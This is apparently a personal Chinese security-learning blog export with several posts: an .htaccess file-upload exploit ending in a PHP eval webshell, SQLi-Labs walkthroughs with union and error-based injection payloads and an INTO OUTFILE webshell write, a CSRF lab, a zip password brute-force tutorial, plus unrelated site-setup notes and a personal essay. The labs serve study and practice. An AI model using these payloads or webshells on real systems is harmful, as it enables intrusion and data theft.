class="line">//检测存放上传文件的路径是否存在，如果不存在则新建目录</span><br><span class="line">	if (!file_exists(&apos;uploads&apos;))&#123;</span><br><span class="line">		mkdir(&apos;uploads&apos;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">//将文件从临时路径移动到磁盘</span><br><span class="line">	if (move_uploaded_file($temp_name, &apos;uploads/&apos;.$filename))&#123;</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&apos;upload success！&apos;);window.history.go(-1);&lt;/script&gt;&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&apos;upload fail,ERROR：$error&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;ggboom993&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/filesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>ggboom993.html</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">@eval($_POST[&apos;ggboom993&apos;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上传.htaccess和html文件</p>
<img src="/2020/01/20/htaccess文件上传漏洞利用/timg1.PNG">
<img src="/2020/01/20/htaccess文件上传漏洞利用/timg2.PNG">

<p>进服务器查看一下，确认上传成功。此时的.htaccess文件将会匹配文件名有”ggboom993”的文件，并强制使用php解析。</p>
<img src="/2020/01/20/htaccess文件上传漏洞利用/timg3.PNG">

<p>在蚁剑中获取shell</p>
<img src="/2020/01/20/htaccess文件上传漏洞利用/timg4.PNG">]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web渗透</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>利用IIS+腾讯云服务器部署网站</title>
    <url>/2020/01/10/%E5%88%A9%E7%94%A8IIS-%E8%85%BE%E8%AE%AF%E4%BA%91%E9%83%A8%E7%BD%B2%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间期末大作业，买了一个月服务器，搭建个网站完成测试，过程也没记录下来。</p>
<p>现在趁着年轻，赶紧回家买了一年服务器（毕竟便宜），一是学习、了解下基本Web配置，二是有个自己的环境吧，方便练手之类的。</p>
<a id="more"></a>

<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>我这里购买的是腾讯云学生服务器，很便宜一个月10，一年120，当然配置也只是勉强能用。</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg1.PNG">

<p>在服务器环境上，我选择Windows server 2012R2 集成了PHPstudy，主要还是为了方便，性能什么的就不考虑了。实名，购买等过程就不加赘述，域名我也不打算弄，因为是自己用。</p>
<h1 id="添加IIS"><a href="#添加IIS" class="headerlink" title="添加IIS"></a>添加IIS</h1><p>购买完成后，在腾讯云控制台可以看见自己的服务器情况，以及进行调整资源、配置安全组等操作。</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg2.PNG">

<p>登录服务器之后，会自动跳出服务器管理工具，选择添加角色和功能把IIS服务勾选添加</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg3.PNG">

<p>下一步后，展开.NET Framework4.5 勾选ASP.NET 以及CGI之后一直下一步到安装</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg4.PNG">

<p>安装完成后通过控制面板→系统和安全→管理工具 打开IIS管理工具</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg5.PNG">

<h1 id="Web配置"><a href="#Web配置" class="headerlink" title="Web配置"></a>Web配置</h1><p>在IIS管理工具中添加网站文件，设置网站名称、网站路径、端口等</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg6.PNG">

<p>需要对网站添加一些配置。首先开启目录浏览，选择网站→目录浏览→启用</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg7.PNG">

<p>接着打开默认文档，设定初始加载网页。由于我这里使用的是PHP的网站源码，所以需要根据源码添加XXX.php</p>
<p>添加映射。选择处理程序映射→添加模块映射</p>
<p>选择FastCgiModule模块，并添加exe文件</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg8.PNG">

<p>接着我在配置中开启了父路径，开启父路径后可以用../来表示上一层目录，如果网站程序中使用了../，不开启则网站程序里有../就会报错。<br>选择iis下ASP栏目→启用父路径→设置为True.</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg9.PNG">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上做完基本就完成了，可以现在本地浏览，查看效果再发布出去。<br>这次做了一些基本的Web配置，足以让网站顺利运行，日后有其它需要将额外再对配置进行修改。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF本地漏洞实现</title>
    <url>/2019/12/29/%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0csrf/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSRF(跨站请求伪造)</p>
<p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 CSRF攻击需要很多条件，首先用户需要点击恶意连接，其次用户PC上需要已经打开包含CSRF的网页。</p>
<a id="more"></a>

<h1 id="本地实现"><a href="#本地实现" class="headerlink" title="本地实现"></a>本地实现</h1><p>这里使用Pikachu靶场来进行演示。GitHub：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
<p>进入到靶场中包含CSRF的页面。</p>
<img src="/2019/12/29/本地靶场复现csrf/timg1.PNG">

<p>选择修改信息然后使用burp抓包，</p>
<img src="/2019/12/29/本地靶场复现csrf/timg2.PNG">

<p>可以发现浏览器URL中没有信息，但是使用burp抓包后，可以看见要修改的信息，sex等，然后将此包send to repeater</p>
<p>在repeater里面将包中信息的内容进行修改，然后send，观察下页面上的信息，已经改变了</p>
<img src="/2019/12/29/本地靶场复现csrf/timg3.PNG">

<p>到这一步就可以发现确实是存在CSRF漏洞的，在burp中可以直接生成CSRF的相关POC，此功能只有burp pro版可以使用，所以该破解的还是要破解</p>
<img src="/2019/12/29/本地靶场复现csrf/timg4.png">

<p>利用burp生成的POC其实是一串HTML代码，里面是一个信息from表单。当用户已经打开了修改信息页面，并且此时点击了包含POC的恶意链接，那么用户的信息就会被修改为指定信息。</p>
<h1 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h1><p>由此可见CSRF的触发条件虽然苛刻，但是CSRF同样存在危害。</p>
<p>网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web渗透</tag>
        <tag>靶场练习</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo主题个人优化</title>
    <url>/2019/11/18/hexo%E4%B8%BB%E9%A2%98%E4%B8%AA%E4%BA%BA%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不久之前搭建了hexo博客，陆陆续续的上传了一些整理的东西，之后的内容慢慢来吧。闲下来的时候会逛逛别人的博客，看些技术文章，有时也纯欣赏，回过头看看自己的，一言难尽。博客的内容需要日积月累，但是对于美的追求可以说来就来。</p>
<p>最开始配置hexo的时候，next主题是使用人数最多的，不过当时没选它，我用的是yilia主题，看上了它的简单，之后做美化还是改成了next，这时候觉得它布局好，可塑性强。</p>
<p>百度上一搜一大把的next主题优化，无非就是主题配置的 true or false的选择开关，或者一些便捷性改变，比如添加友链，添加分类等等，这些也能在<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">next官方文档</a>直接查看，做完这些之后，我发现并不能让我的博客与众不同。也看了更多的next主题美化，内容多是大同小异，即便有令人惊艳之处，作者也不会在文章中说明详细。</p>
<a id="more"></a>

<p>经过十几个小时的摸索中，可以说弄明白了next主题的大部分css样式，并且经过自己修改，结果还算满意，这是截止至2019年11月18日的博客样子</p>
<img src="/2019/11/18/hexo主题个人优化/主页.PNG" title="主页">

<p>下面我将会详细说明我修改的next主题css和基本配置，以供自我回顾，和方便有兴趣的读者参考。</p>
<h1 id="主题文件配置"><a href="#主题文件配置" class="headerlink" title="主题文件配置"></a>主题文件配置</h1><p>此项所有都在 /blog/thems/next/_config.yml 中修改，可直接搜索关键字定位。</p>
<h2 id="主题样式"><a href="#主题样式" class="headerlink" title="主题样式"></a>主题样式</h2><p>选择为next主题下的 Mist</p>
<img src="/2019/11/18/hexo主题个人优化/timg1.PNG">

<h2 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h2><p>菜单栏增加 主页、关于、标签、分类、归档</p>
<img src="/2019/11/18/hexo主题个人优化/timg2.PNG">

<h2 id="侧边栏"><a href="#侧边栏" class="headerlink" title="侧边栏"></a>侧边栏</h2><p>调整侧边栏出现方向，宽度</p>
<img src="/2019/11/18/hexo主题个人优化/timg3.PNG">


<h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><p>需将头像图片放入/image/中，自由命名。</p>
<p>设立圆形头像</p>
<p>设立头像旋转</p>
<img src="/2019/11/18/hexo主题个人优化/timg4.PNG">


<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><p>联系方式显示在侧边栏中，这里只选择了github和weibo，修改时需替换url为自己的地址。</p>
<img src="/2019/11/18/hexo主题个人优化/timg5.PNG">

<h2 id="友情链接"><a href="#友情链接" class="headerlink" title="友情链接"></a>友情链接</h2><p>友情链接可以自己自定义内容，如推荐阅读等</p>
<img src="/2019/11/18/hexo主题个人优化/timg6.PNG">

<h2 id="显示阅读字数，时间"><a href="#显示阅读字数，时间" class="headerlink" title="显示阅读字数，时间"></a>显示阅读字数，时间</h2><p>在主题文件中做如下修改：</p>
<img src="/2019/11/18/hexo主题个人优化/timg7.PNG">

<p>在站点配置文件（/blog/_config.yml）中添加：</p>
<img src="/2019/11/18/hexo主题个人优化/timg8.PNG">

<h2 id="代码块颜色"><a href="#代码块颜色" class="headerlink" title="代码块颜色"></a>代码块颜色</h2><p>可在注释中Available values中进行选择</p>
<img src="/2019/11/18/hexo主题个人优化/timg9.PNG">

<h2 id="显示阅读百分比和回到顶端"><a href="#显示阅读百分比和回到顶端" class="headerlink" title="显示阅读百分比和回到顶端"></a>显示阅读百分比和回到顶端</h2><img src="/2019/11/18/hexo主题个人优化/timg10.PNG">

<h2 id="设置动态背景（next自带）"><a href="#设置动态背景（next自带）" class="headerlink" title="设置动态背景（next自带）"></a>设置动态背景（next自带）</h2><p>我选择的是canvas_nest，下面参数设定了线条颜色，数量，粗细</p>
<img src="/2019/11/18/hexo主题个人优化/timg11.PNG">

<h1 id="CSS样式修改"><a href="#CSS样式修改" class="headerlink" title="CSS样式修改"></a>CSS样式修改</h1><p>CSS样式文件位于/blog/themes/next/source/css/_schemes/Mist<br>因为我是用的是Mist所以我修改的CSS都是Mist的CSS，其余主题分支仅供参考</p>
<h2 id="顶部区域"><a href="#顶部区域" class="headerlink" title="顶部区域"></a>顶部区域</h2><p>1、修改顶部区域背景。RBG色透明度0.4</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_header.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg12.PNG">

<h2 id="菜单栏-1"><a href="#菜单栏-1" class="headerlink" title="菜单栏"></a>菜单栏</h2><p>1、改菜单栏选项的样式，圆角、模块长度</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_menu.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg13.PNG">


<h2 id="分页栏"><a href="#分页栏" class="headerlink" title="分页栏"></a>分页栏</h2><p>1、修改分页栏长度，居中，背景透明，字体颜色</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_layout.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg14.PNG">

<h2 id="底部区域"><a href="#底部区域" class="headerlink" title="底部区域"></a>底部区域</h2><p>1、修改底部区域背景透明，间距，字体颜色</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_layout.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg15.PNG">

<h2 id="主页面文章区域"><a href="#主页面文章区域" class="headerlink" title="主页面文章区域"></a>主页面文章区域</h2><p>1、修改主页每篇文章小框架间距，以及标题居中</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_posts-expand.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg16.PNG">

<p>2、修改“阅读全文”，背景、位置等</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_posts-expand.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg18.PNG">

<p>3、修改主页文章区域背后的白色区域，这里修改为透明</p>
<p>位于/blog/themes/next/source/css/_custom/custom.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg17.PNG">

<p>4、主页面单独文章框体宽度</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_layout.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg21.PNG">

<p>5、修改文章内链样式</p>
<p>位于/blog/themes/next/source/css/_common/components/post/post.styl</p>
<p>不修改之前内链颜色为灰色+下划线，不明显，修改之后为蓝色</p>
<img src="/2019/11/18/hexo主题个人优化/timg22.PNG">


<h2 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h2><p>1、需将背景图片放入/images/可自由命名</p>
<p>位于/blog/themes/next/source/css/_custom/custom.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg19.PNG">

<h2 id="侧边栏-1"><a href="#侧边栏-1" class="headerlink" title="侧边栏"></a>侧边栏</h2><p>1、侧边栏我没做很多调整，只修改了字体颜色，看的更清楚些</p>
<p>位于/blog/themes/next/source/css/_common/outline/sidebar/sidebar.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg20.PNG">


<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>以上就是我的hexo配置。在文件位置中/blog/为自己搭建hexo的根目录，其余在css中提到的修改，如果没有找到对应语句，可自行添加。在next主题7.x中css文件下没有_custom/custom.styl，可自行创建文件，并在<br>在./blog/themes/next/source/css/main.styl末尾加入 @import “_custom/custom.styl”; 引用即可</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>博客相关</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLi-Labs过关笔记</title>
    <url>/2019/11/17/SQLi-Labs/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SQLi-Labs是某印度程序猿开发的一套练习SQL注入的靶场，共计65关。难度从浅入深，涉及多种sql注入方法</p>
<p>原项目地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
<p>本篇将逐步上传已经完成关卡的攻略过程，以及更新未完成的攻略。</p>
<a id="more"></a>

<h1 id="Less1-Less10"><a href="#Less1-Less10" class="headerlink" title="Less1-Less10"></a>Less1-Less10</h1><h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><p>1、首先已经判断出是 ‘ 闭合，order by判断字段数，从下图可见 3正确4错误 </p>
<p>-1’order by 3–+</p>
<img src="/2019/11/17/SQLi-Labs/timg1.PNG">
<img src="/2019/11/17/SQLi-Labs/timg2.PNG">

<p>2、接下来联合查询看回显，得到数据库和用户</p>
<p>-1’ union select 1,databse(),user()–+</p>
<img src="/2019/11/17/SQLi-Labs/timg3.PNG">

<p>3、爆表名</p>
<p>-1’ union select 1,2,table_name from information_schema.tables<br>where table_schema=database()–+</p>
<img src="/2019/11/17/SQLi-Labs/timg4.PNG">

<p>4、爆出users中的列名</p>
<p>-1’ union select 1,2,column_name from information_schema.columns<br>where table_name=’users’–+</p>
<img src="/2019/11/17/SQLi-Labs/timg5.PNG">

<p>5、爆出username，同理可爆出password，less1结束</p>
<img src="/2019/11/17/SQLi-Labs/timg6.PNG">


<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>1、判断闭合，发现加入单引号或双引号提示数据库语句错误，最后确定是没有闭合的常规数字型注入</p>
<img src="/2019/11/17/SQLi-Labs/timg7.PNG">

<p>2、之后的过程同less1一样，不再重复描述，less2结束</p>
<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>1、判断闭合，加入单引号，发现报错。 可以通过报错判断出，是 ‘) 闭合</p>
<img src="/2019/11/17/SQLi-Labs/timg8.PNG">

<p>2、看回显，没问题，之后的过程同less1一样，不再重复描述，less3结束</p>
<img src="/2019/11/17/SQLi-Labs/timg9.PNG">

<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>1、闭合，加入’发现没有报错，加入”报错，通过报错可以判断，是”）闭合判断</p>
<img src="/2019/11/17/SQLi-Labs/timg10.PNG">

<p>2、看回显，没问题，之后过程同less1一样，不再重复描述，less4结束</p>
<img src="/2019/11/17/SQLi-Labs/timg11.PNG">

<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>1、判断闭合，加入’发现报错，加入”没有报错，接着”and1=2–+ 发现没报错,-1”union select 1,2,3 –+无回显，所以猜测使用报错注入</p>
<img src="/2019/11/17/SQLi-Labs/timg12.PNG">

<p>常用报错注入有三种：floor报错，updatexml报错，extractvalue报错<br>这里使用floor报错 ‘ 闭合</p>
<p>2、爆库</p>
<p>通过调整limit达到遍历的效果，找到需要的库<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database() group by concat(0x7e,(select schema_name from information_schema.schemata limit 8,1),0x7e,floor(rand(0)*2))–+</p>
<img src="/2019/11/17/SQLi-Labs/timg13.PNG">

<p>3、爆表</p>
<p>同理可调整limit遍历出需要的表users<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e,floor(rand(0)*2))–+</p>
<img src="/2019/11/17/SQLi-Labs/timg14.PNG">


<p>4、爆列</p>
<p>调整limit遍历出 id,username,password<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database() group by concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 2,1),0x7e,floor(rand(0)*2))–+</p>
<img src="/2019/11/17/SQLi-Labs/timg15.PNG">

<p>5、爆数据</p>
<p>调整列名以及limit遍历出对应列下面的数据<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database()  group by concat(0x7e,(select username from users limit 1,1),0x7e,floor(rand(0)*2))–+</p>
<p>less5结束</p>
<img src="/2019/11/17/SQLi-Labs/timg16.PNG">

<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><p>根据主页less6的名称可以知道是 “ 闭合，剩下步骤同less5，不再描述，less6结束</p>
<img src="/2019/11/17/SQLi-Labs/timg17.PNG">

<h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>less7的标题是这样描述的 dump into outfile 提示我们写入外部文件<br>需要利用数据库的into outfile 命令</p>
<p>1、通过尝试发现是 ‘))闭合，然后用以下命令写入文件，并加入一句话</p>
<p>?id=-1’))  union select 1,”此处放入一句话”,3 into outfile “D:\phpStudy\PHPTutorial\WWW\less7.php” –+</p>
<img src="/2019/11/17/SQLi-Labs/timg18.PNG">

<p>完成后因为条件允许，所以可以去本地目录验证一下</p>
<img src="/2019/11/17/SQLi-Labs/timg19.PNG">

<p>很好，可以看见这里没有写入的less7.php，找一找问题出在哪里。检查语法，检查mysql，都没有问题。估计是权限的问题，然后经过一番询问和百度，找到了原因。在mysql配置文件my.ini下有一个参数，secure-file-priv。由于启动mysql的时候使用了secure-file-priv这个参数，这个参数的主要目的就是限制LOAD DATA INFILE或者SELECT INTO OUTFILE之类文件的目录位置。我的my.ini中没有找到这个参数，不要紧，手动添加secure-file-priv = “”</p>
<pre><code>其中当参数 secure_file_priv 为空时，对导入导出无限制
当值为一个指定的目录时，只能向指定的目录导入导出
当值被设置为NULL时，禁止导入导出功能</code></pre><p>关于mysqlsecure-file-priv权限的详细解答：<br><a href="https://blog.csdn.net/bnxf00000/article/details/64123549" target="_blank" rel="noopener">https://blog.csdn.net/bnxf00000/article/details/64123549</a></p>
<p>2、重启mysql,重新写入并验证,成功</p>
<img src="/2019/11/17/SQLi-Labs/timg20.PNG">

<p>3、上菜刀连接</p>
<p>结果如图，less7结束</p>
<img src="/2019/11/17/SQLi-Labs/timg21.PNG">

<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web渗透</tag>
        <tag>靶场练习</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>尘</title>
    <url>/2019/11/13/%E5%B0%98/</url>
    <content><![CDATA[<h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><p>尘，不知道下一刻自己会去哪</p>
<p>尘，不知道下一刻会不会遇见其他的尘</p>
<p>尘，不知道下一刻自己是什么样</p>
<p>尘，没有思考</p>
<p>尘，独自漂着</p>
<a id="more"></a>

<h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>已经不记得什么时候了，我再也没有尝试走回宿舍——从整个学校的大门走回宿舍。</p>
<p>今天偶然的又走了一次，感觉不再同从前一样。</p>
<p>从学校大门走回宿舍的距离是比较远的，多数人的选择除了骑单车就是校园巴士，而我，就算抱再多东西都是愿意走路回去的。</p>
<p>但是今天不一样，也许是今天才意识到不一样。尽管同样是走回宿舍。直到这一次走回宿舍，才想起，上一次走回宿舍已经是上学期的事了。这样的感觉和以往是不同的，像尘。<br>没有意识，没有思考，没有准备，难以预料的下一刻，等回过神来，才发现，原来自己已经和其它尘一样了，我遇见了那个尘，也变成了一模一样的尘。</p>
<p>同样的路程，今天走的格外疲惫，时间也慢了下来。特地放慢脚步的我，每往前走一步，便感觉与一些东西渐行渐远，像过去，像我，像尘。</p>
<p>走了很久，走了很远，抬头的时候已经在宿舍楼下了，反复环视了一圈才告诉自己，目的地到了，不容易，也不困难。可是，走完这一程就真的走完了。下一次在什么时候呢？<br>尘不知道，我不知道。</p>
<h4 id="三"><a href="#三" class="headerlink" title="三"></a>三</h4><p>我已经忘了我的初心是什么。在一些事情之前，我以为我会变得不一样，我能够敞开心扉，我们够不再躲藏，我可以不用担心我的情绪，不用担心对方的情绪，我总是这样敏感。<br>事实上，最初我以为的，已经在时间磨砺下显露出埋藏在戎装之下的娇嫩，轻轻一划，留下伤疤。</p>
<p>当我能在脑海里想象出那样娇嫩的时候，我清楚地明白，我依然默许了躲藏，我藏着我的不甘，我藏着我的不满，我让我的忍耐不被发现，我让我的表情始终如一，生怕暴露出的锋利划伤了那样的娇嫩。以前我怕划伤别人，现在我怕划伤自己，可终究会有尽头的，我知道。</p>
<p>从今天再一次走回宿舍起，从今天我选择躲藏起，我不会是以前的我，我更不是现在的我，我也不是未来的我。我只是像一粒尘：</p>
<p>不知道下一刻自己会去哪，</p>
<p>不知道下一刻会不会遇见其他尘，</p>
<p>不知道下一刻自己是什么样，</p>
<p>没有思考，</p>
<p>独自飘着。</p>
]]></content>
      <categories>
        <category>浮生六记</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>Python_ZipCrack_Zip暴破</title>
    <url>/2019/11/11/Python%E5%AE%9E%E7%8E%B0Zip%E5%AF%86%E7%A0%81%E6%9A%B4%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>提高自己编程能力，编写小脚本，小工具是非常重要的。</p>
<p>届时不会因为别人写的工具无法应用到当前特殊情况而苦恼，不必再去花费许久时间百度各种各样的杂乱工具下载。自己编写出适应的，特制的小工具在关键时候往往能达到事半功倍的效果。</p>
<p>这里我选择了python，今天将通过python实现Zip口令爆破</p>
<h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>python version：2.7</p>
<p>library： zipfile、threading、optparse</p>
<p>此工具通过 zipfile （zip处理库）、optparse （解析脚本标志和可选参数）、threading  （导入线程）三个库在python2.7环境下完成</p>
<a id="more"></a>

<h1 id="0x02-实现分析"><a href="#0x02-实现分析" class="headerlink" title="0x02 实现分析"></a>0x02 实现分析</h1><h4 id="Zipfile"><a href="#Zipfile" class="headerlink" title="Zipfile"></a>Zipfile</h4><p>在Zipfile模块中只使用它的zip文件解压功能</p>
<p>ZipFile.extractall(path, members, pwd)</p>
<p>解压zip文档中的所有文件到当前目录。参数members的默认值为zip文档内的所有文件名称列表，也可以自己设置选择要解压的文件名称。</p>
<p>这是一段zipfile的简单用法，它实现了最简单的zip密码测试，但是只能从源码上指定一个密码，以及预先指定的zip文件，非常简陋</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import zipfile <span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">zFile = zipfile.ZipFile(<span class="string">'test.zip'</span>) <span class="comment">#解压Zip文件</span></span><br><span class="line"></span><br><span class="line">zFile.exctractall(<span class="built_in">pwd</span>=123)<span class="comment">#使用密码 123</span></span><br></pre></td></tr></table></figure>

<h4 id="optparse"><a href="#optparse" class="headerlink" title="optparse"></a>optparse</h4><p>optparse是一个python内置的命令解析模块，它可以用来为脚本传递命令行参数，采用预先定义好的选项来解析命令行参数。</p>
<p>add_option()用来加入选项,其中各个参数的使用：<br>dest：用于保存输入的临时变量，其值通过options的属性进行访问，存储的内容是-f或 –file之后输入的参数<br>help：用于生成帮助信息<br>default: 给dest的默认值，如果用户没有在命令行参数给dest分配值，则使用默认值<br>type: 用于检查命令行参数传入的参数的数据类型是否符合要求，有string，int，float等类型<br>action: 用于指导程序在遇到命令行参数时候该如何处理，有三种值可选： store,store_false和store_true,默认值是store<br>store：读取参数，如果参数类型符合type的要求，则将参数值传递给dest变量，作为options的一个属性供使用。<br>store_true/store_false: 一般作为一个标记使用，分别设置dest变量的值为True和False</p>
<p>下面是一个简单的add_option()使用例子，它简单实现了在命令行通过 -f 传入文件名称，-d 传入字典名称</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import optparse <span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">parser = optparse.OptionParser()<span class="comment">#初始化，实例化一个OptionParser对象</span></span><br><span class="line">parse.add_option(<span class="string">'-f'</span>,dest=<span class="string">'filename'</span>,<span class="built_in">type</span>=<span class="string">'string'</span>,<span class="built_in">help</span>=<span class="string">'Specify a file name'</span>)<span class="comment">#指定命令行参数 -f 之后所输入的内容作为变量filename的值 类型为string </span></span><br><span class="line">perse.add_option(<span class="string">'-d'</span>,dest=<span class="string">'dictionary'</span>,<span class="built_in">type</span>=<span class="string">'string'</span>,<span class="built_in">help</span>=<span class="string">'Specify a dictionary name'</span>)<span class="comment">#指定命令行参数 -d 之后所输入的内容作为变量dictionary的值 类型为string</span></span><br><span class="line">(option.args) = parse.parse_args()</span><br></pre></td></tr></table></figure>

<p>在(option.args) = parse.parse_args()中,<br>options是通过parse.parse_args()返回的一个字典，这个字典的关键字是我们传入的dest，对应的值是我们通过命令行输入的参数后面的值，比如 -f之后所输入的文件名，字典名等，只要知道命令行参数名，如file,就可以访问其对应的值：options.file。<br>args是通过parse.parse_args()返回的一个列表，里面存放了内容</p>
<p>将通过一个例子来理解(option.args) = parse.parse_args()。在这例子中，将给 parser.parse_args() 传入参数 FakeArgs </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FakeArgs = [<span class="string">'-f'</span>,<span class="string">'file.txt'</span>,<span class="string">'-d'</span>,<span class="string">'hello world'</span>,<span class="string">'123456'</span>,<span class="string">'password'</span>]</span><br><span class="line">options_test,args_test = parser.parse_args(FakeArgs)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'options_test :'</span>+ options_test</span><br><span class="line"><span class="built_in">print</span> <span class="string">'args_test :'</span>+ args_test</span><br></pre></td></tr></table></figure>

<p>此时的输出结果为：</p>
<pre><code>options_test :  file.txt 
args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</code></pre><h4 id="Threading"><a href="#Threading" class="headerlink" title="Threading"></a>Threading</h4><p>使用Threading模块，可以提高暴力破解的性能，利用线程同时测试多个密码，而不是只能逐个测试，对字典中的每一个密码都会生成一个新线程去测试它。这里只使用了Threading模块中的Thread类</p>
<p>Thread类中的对象和描述：</p>
<p>name : 线程名（属性）</p>
<p>ident : 线程标识符（属性）</p>
<p>daemon : 线程是否是守护线程（属性）</p>
